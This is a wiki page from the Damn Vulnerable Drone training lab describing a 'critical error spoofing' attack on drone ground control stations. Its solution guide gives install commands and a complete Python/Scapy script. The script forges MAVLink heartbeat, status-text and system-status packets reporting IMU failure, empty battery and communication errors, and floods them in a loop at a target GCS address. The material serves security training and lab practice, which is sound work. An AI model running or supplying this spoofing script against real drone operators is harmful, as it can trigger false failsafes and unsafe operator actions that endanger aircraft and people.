<i>Spoofing critical error messages to mislead the Ground Control Station (GCS) about the drone's status.</i>

[Damn Vulnerable Drone](/nicholasaleks/Damn-Vulnerable-Drone) > [Attack Scenarios](/nicholasaleks/Damn-Vulnerable-Drone/wiki/Attack-Scenarios) > Protocol Tampering > Critical Error Spoofing

# Description

Critical error spoofing involves sending false critical error messages to the Ground Control Station (GCS) to mislead it about the drone's status. This can cause the operator to take unnecessary corrective actions, potentially disrupting the drone's mission.

# Resources

- <a href="https://mavlink.io/en/">MAVLink Protocol</a>  
- <a href="https://mavlink.io/en/mavgen_python/">PyMAVLink Documentation</a>

---

<details>
<summary><strong>⚠️ Solution Guide</strong></summary>

<h3>Step 1. Setup</h3>
<pre><code class="code mb-3 mt-3">sudo apt-get update
sudo apt-get install python3 python3-pip
pip3 install pymavlink scapy
</code></pre>

---

<h3>Step 2. Create the Script</h3>
<p>Save the following code as <code>critical-error-spoofing.py</code>:</p>

<pre><code class="code mb-3 mt-3">from pymavlink import mavutil
from scapy.all import *
import time
import sys

def create_heartbeat():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.heartbeat_encode(
        type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
        autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
        base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        custom_mode=3,
        system_status=mavutil.mavlink.MAV_STATE_CRITICAL
    ).pack(mav)

def create_statustext():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.statustext_encode(
        severity=mavutil.mavlink.MAV_SEVERITY_CRITICAL,
        text="CRITICAL ERROR: IMU FAILURE".encode('utf-8')
    ).pack(mav)

def create_sys_status():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.sys_status_encode(
        onboard_control_sensors_present=0xFFFFFFFF,
        onboard_control_sensors_enabled=0xFFFFFFFF,
        onboard_control_sensors_health=0x00000000,
        load=1000,
        voltage_battery=0,
        current_battery=0,
        battery_remaining=0,
        drop_rate_comm=1000,
        errors_comm=100,
        errors_count1=100,
        errors_count2=100,
        errors_count3=100,
        errors_count4=100
    ).pack(mav)

def send_mavlink_packet(packet_data, target_ip, target_port):
    packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
    send(packet)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python critical-error-spoofing.py &lt;ip:port&gt;")
        sys.exit(1)

    target_ip, target_port = sys.argv[1].split(':')
    target_port = int(target_port)

    while True:
        send_mavlink_packet(create_heartbeat(), target_ip, target_port)
        send_mavlink_packet(create_statustext(), target_ip, target_port)
        send_mavlink_packet(create_sys_status(), target_ip, target_port)
        print(f"Sent heartbeat, STATUSTEXT, and SYS_STATUS packets to {target_ip}:{target_port} indicating a critical error")
</code></pre>

---

<h3>Step 3. Run the Script</h3>
<p>Run the script using the IP and port of your GCS:</p>

<pre><code class="code mb-3 mt-3">sudo python3 critical-error-spoofing.py 10.13.0.6:14550</code></pre>

<p>Example targets:</p>
<ul>
  <li><code>10.13.0.6:14550</code> – QGroundControl</li>
  <li><code>192.168.13.14:14550</code> – MAVProxy (WiFi)</li>
  <li><code>10.13.0.4:14550</code> – MAVProxy (Bridge)</li>
</ul>

---

<h3>Step 4. Monitor the Effects</h3>
<p>Observe the Ground Control Station. The spoofed telemetry will show:</p>
<ul>
  <li>IMU failure error messages</li>
  <li>0% battery remaining</li>
  <li>Communication dropouts and high error counts</li>
</ul>

<p>This may cause the GCS to enter failsafe or alarm states, prompting corrective actions by the operator.</p>

</details>
